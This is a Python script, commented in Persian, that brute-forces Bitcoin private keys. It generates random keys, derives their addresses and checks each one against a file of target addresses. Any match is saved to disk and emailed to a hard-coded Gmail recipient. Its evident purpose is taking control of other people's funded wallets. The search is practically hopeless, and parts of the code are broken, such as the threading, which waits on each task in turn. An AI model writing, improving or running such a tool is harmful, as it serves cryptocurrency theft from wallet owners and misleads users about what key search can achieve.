import random, codecs, time, asyncio
from bit.format import bytes_to_wif
from bit import Key
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from concurrent.futures import ThreadPoolExecutor
import threading

# تولید کلید هگزادسیمال بهینه شده
def _HexGen(size):
    return ''.join(random.choices("0123456789abcdef", k=size))

# تبدیل هگز به WIF
def _HexToWif(Hex):
    byteHex = codecs.decode(Hex, 'hex')
    return bytes_to_wif(byteHex, compressed=True), bytes_to_wif(byteHex, compressed=False)

# تبدیل WIF به آدرس
def _WifToAddr(WifCompressed, WifUnCompressed):
    return Key(WifCompressed).address, Key(WifUnCompressed).address

# بارگذاری فایل هدف در حافظه
def _LoadTargetFile(FileName):
    with open(FileName) as f:
        return {line.strip() for line in f}

# ارسال ایمیل به صورت غیرهمزمان
async def send_email(sender, receiver, subject, body):
    try:
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(sender, "your_password")  # قرار دادن رمز عبور صحیح
        msg = MIMEMultipart()
        msg["From"] = sender
        msg["To"] = receiver
        msg["Subject"] = subject
        msg.attach(MIMEText(body))
        server.sendmail(sender, receiver, msg.as_string())
        server.quit()
        return True
    except Exception as e:
        print(e)
        return False

# تابع اصلی بررسی کلیدها
def check_key(Target, lock):
    Private_Key = _HexGen(64)
    WifCompressed, WifUncompressed = _HexToWif(Private_Key)
    CompressAddr, UnCompressAddr = _WifToAddr(WifCompressed, WifUncompressed)

    if CompressAddr in Target or UnCompressAddr in Target:
        with lock:  # استفاده از قفل برای جلوگیری از مشکل در چند نخ
            with open('content/asdasdas/found.txt', 'a') as f:
                f.write(f'Compressed Address: {CompressAddr}\n'
                        f'UnCompressed Address: {UnCompressAddr}\n'
                        f'Private Key: {Private_Key}\n'
                        f'WIF (Compressed): {WifCompressed}\n'
                        f'WIF (UnCompressed): {WifUncompressed}\n')
        
        body = (f"Compressed Address: {CompressAddr}\n"
                f"UnCompressed Address: {UnCompressAddr}\n"
                f"Private Key: {Private_Key}\n"
                f"WIF (Compressed): {WifCompressed}\n"
                f"WIF (UnCompressed): {WifUncompressed}\n")
        asyncio.run(send_email("pouriya.guitar@gmail.com", "tatalbet666@gmail.com", "هش", body))
        return True
    return False

# اجرای حلقه اصلی به صورت موازی با تعداد زیاد
def MainCheck():
    target_file = '/content/Bitcoin_addresses_LATEST.txt'
    Target = _LoadTargetFile(target_file)

    z = 0
    wf = 0
    lg = 0
    start_time = time.time()  # زمان شروع برای محاسبه سرعت تولید کلید
    lock = threading.Lock()  # قفل برای همگام‌سازی نوشتن فایل

    with ThreadPoolExecutor(max_workers=100) as executor:  # افزایش تعداد نخ‌ها به 100
        while True:
            z += 1
            future = executor.submit(check_key, Target, lock)
            if future.result():  # کلید مورد نظر پیدا شد
                wf += 1
            if z % 100000 == 0:
                lg += 100000
                print(f"Generated: {lg} (SHA-256 - HEX) ...")
            else:
                lct = time.localtime()
                tm = time.strftime("%Y-%m-%d %H:%M:%S", lct)
                print(f"[{tm}][Total: {z} Check: {z * 2}] #Found: {wf} ", end="\r")

            # محاسبه تعداد کلیدهای تولید شده در هر ثانیه
            if z % 1000 == 0:  # هر 1000 کلید، سرعت را محاسبه کن
                elapsed_time = time.time() - start_time
                keys_per_second = z / elapsed_time
                print(f"\nKeys per second: {keys_per_second:.2f}")

if __name__ == '__main__':
    MainCheck()
